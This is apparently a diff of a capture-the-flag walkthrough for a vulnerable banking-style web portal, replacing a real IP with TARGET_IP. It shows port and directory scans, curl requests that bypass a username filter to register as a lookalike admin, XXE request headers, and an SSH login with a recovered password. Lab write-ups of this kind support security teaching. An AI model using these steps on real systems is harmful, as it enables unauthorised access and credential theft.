@@ -9,7 +9,7 @@ Electricity bill portal has been hacked many times in the past, so we have fired
 1. Start with a full port scan to see what's exposed.
 
 ```bash
-nmap -sV -p- 10.112.187.193
+nmap -sV -p- TARGET_IP
 ```
 
 Results:
@@ -24,7 +24,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 2. Directory brute-force. A first pass with a plain wordlist and no extensions only turns up static files, which makes the site look like a dead end at first. Re-running with PHP extensions included is what actually uncovers the real web application.
 
 ```bash
-feroxbuster -u http://10.112.187.193 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -C 404
+feroxbuster -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -C 404
 ```
 
 Results:
@@ -32,33 +32,33 @@ Results:
 ```
 403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET       24l       57w      406c http://10.112.187.193/
-200      GET       25l       56w      663c http://10.112.187.193/admin.php
-200      GET       27l       61w      715c http://10.112.187.193/register.php
-301      GET        9l       28w      317c http://10.112.187.193/scripts => http://10.112.187.193/scripts/
-200      GET       21l      131w    18602c http://10.112.187.193/report
-200      GET       24l       57w      406c http://10.112.187.193/index.html
-200      GET       39l      118w     1236c http://10.112.187.193/scripts/jquery-mobilemenu.min.js
-200      GET      112l      193w     2334c http://10.112.187.193/forms.php
-302      GET       55l       86w      908c http://10.112.187.193/dashboard.php => admin.php
-200      GET       66l      110w     1104c http://10.112.187.193/acc.php
-302      GET        0l        0w        0c http://10.112.187.193/logout.php => admin.php
-200      GET      152l     1205w    70843c http://10.112.187.193/scripts/jquery.min.js
-200      GET        4l     1202w    93068c http://10.112.187.193/scripts/jquery.1.9.0.min.js
-302      GET       72l      129w     1399c http://10.112.187.193/tra.php => admin.php
-302      GET       70l      119w     1259c http://10.112.187.193/with.php => admin.php
-302      GET       70l      119w     1258c http://10.112.187.193/depo.php => admin.php
-200      GET        1l        1w        5c http://10.112.187.193/scripts/ie/index.html
-301      GET        9l       28w      320c http://10.112.187.193/scripts/ie => http://10.112.187.193/scripts/ie/
+200      GET       24l       57w      406c http://TARGET_IP/
+200      GET       25l       56w      663c http://TARGET_IP/admin.php
+200      GET       27l       61w      715c http://TARGET_IP/register.php
+301      GET        9l       28w      317c http://TARGET_IP/scripts => http://TARGET_IP/scripts/
+200      GET       21l      131w    18602c http://TARGET_IP/report
+200      GET       24l       57w      406c http://TARGET_IP/index.html
+200      GET       39l      118w     1236c http://TARGET_IP/scripts/jquery-mobilemenu.min.js
+200      GET      112l      193w     2334c http://TARGET_IP/forms.php
+302      GET       55l       86w      908c http://TARGET_IP/dashboard.php => admin.php
+200      GET       66l      110w     1104c http://TARGET_IP/acc.php
+302      GET        0l        0w        0c http://TARGET_IP/logout.php => admin.php
+200      GET      152l     1205w    70843c http://TARGET_IP/scripts/jquery.min.js
+200      GET        4l     1202w    93068c http://TARGET_IP/scripts/jquery.1.9.0.min.js
+302      GET       72l      129w     1399c http://TARGET_IP/tra.php => admin.php
+302      GET       70l      119w     1259c http://TARGET_IP/with.php => admin.php
+302      GET       70l      119w     1258c http://TARGET_IP/depo.php => admin.php
+200      GET        1l        1w        5c http://TARGET_IP/scripts/ie/index.html
+301      GET        9l       28w      320c http://TARGET_IP/scripts/ie => http://TARGET_IP/scripts/ie/
 [####################] - 14m  1764452/1764452 0s      found:18      errors:0
-[####################] - 14m   882184/882184  1056/s  http://10.112.187.193/
-[####################] - 3s    882184/882184  336711/s http://10.112.187.193/scripts/ => Directory listing (add --scan-dir-listings to scan)
-[####################] - 14m   882184/882184  1057/s  http://10.112.187.193/scripts/ie/
+[####################] - 14m   882184/882184  1056/s  http://TARGET_IP/
+[####################] - 3s    882184/882184  336711/s http://TARGET_IP/scripts/ => Directory listing (add --scan-dir-listings to scan)
+[####################] - 14m   882184/882184  1057/s  http://TARGET_IP/scripts/ie/
 ```
 
 This is the real map of the app: a login page, a registration page, a dashboard, and several banking-flavoured pages that all redirect to login when unauthenticated. Two pages load without redirecting even though they should require auth: `acc.php` and `forms.php`. Those two matter later.
 
-3. Download the binary at `http://10.112.187.193/report`. It isn't part of the web app itself, it's a standalone ELF served as a static file.
+3. Download the binary at `http://TARGET_IP/report`. It isn't part of the web app itself, it's a standalone ELF served as a static file.
 
 4. Run `strings` on it before reaching for a disassembler. This alone gives most of what's needed.
 
@@ -145,7 +145,7 @@ The `maxlength` attribute is enforced by the browser only, not the server, so it
 Padding with two trailing spaces is blocked:
 
 ```bash
-curl -s -X POST http://10.112.187.193/register.php \
+curl -s -X POST http://TARGET_IP/register.php \
   --data-urlencode 'uname=admin@bank.a  ' \
   --data-urlencode 'bank=ABC' \
   --data-urlencode 'password=Password123' \
@@ -158,7 +158,7 @@ Response includes `alert('Nope you are wasting your time ;) ')`.
 Swapping the case is also blocked, which rules out a simple case-sensitive match:
 
 ```bash
-curl -s -X POST http://10.112.187.193/register.php \
+curl -s -X POST http://TARGET_IP/register.php \
   --data-urlencode 'uname=Admin@bank.a  ' \
   --data-urlencode 'bank=ABC' \
   --data-urlencode 'password=Password123' \
@@ -169,7 +169,7 @@ curl -s -X POST http://10.112.187.193/register.php \
 Same rejection. A 14-character username with no relation to admin@bank.a, still padded with trailing spaces, registers without any issue, which rules out a plain length check:
 
 ```bash
-curl -s -X POST http://10.112.187.193/register.php \
+curl -s -X POST http://TARGET_IP/register.php \
   --data-urlencode 'uname=zzzzzzzzzzzz  ' \
   --data-urlencode 'bank=ABC' \
   --data-urlencode 'password=Password123' \
@@ -180,7 +180,7 @@ curl -s -X POST http://10.112.187.193/register.php \
 Response includes `alert('Registered successfully!')`. Put together, the filter is doing something along the lines of `trim(strtolower($uname)) === "admin@bank.a"`: it strips whitespace and lowercases before comparing, which is why the first two attempts got caught and this one didn't. Padding with ordinary characters instead of whitespace slips past `trim()` entirely and confirms the theory:
 
 ```bash
-curl -s -X POST http://10.112.187.193/register.php \
+curl -s -X POST http://TARGET_IP/register.php \
   --data-urlencode 'uname=admin@bank.aXX' \
   --data-urlencode 'bank=ABC' \
   --data-urlencode 'password=Password123' \
@@ -219,7 +219,7 @@ This is a strong XXE candidate: raw XML built from user input, posted with no en
 
 ```
 POST /forms.php HTTP/1.1
-Host: 10.112.187.193
+Host: TARGET_IP
 Content-Type: text/xml
 Cookie: PHPSESSID=561jbgehgv4pofcjpmbr2999l7
 Content-Length: 178
@@ -233,7 +233,7 @@ The response reflects whatever was submitted as `<search>`, not `<name>`, so the
 
 ```
 POST /forms.php HTTP/1.1
-Host: 10.112.187.193
+Host: TARGET_IP
 Content-Type: text/xml
 Cookie: PHPSESSID=561jbgehgv4pofcjpmbr2999l7
 Content-Length: 184
@@ -255,7 +255,7 @@ That's an SSH credential for a real account on the box.
 13. SSH in as `cyber`.
 
 ```bash
-ssh cyber@10.112.187.193
+ssh cyber@TARGET_IP
 # Password: super#secure&password!
 ```
 
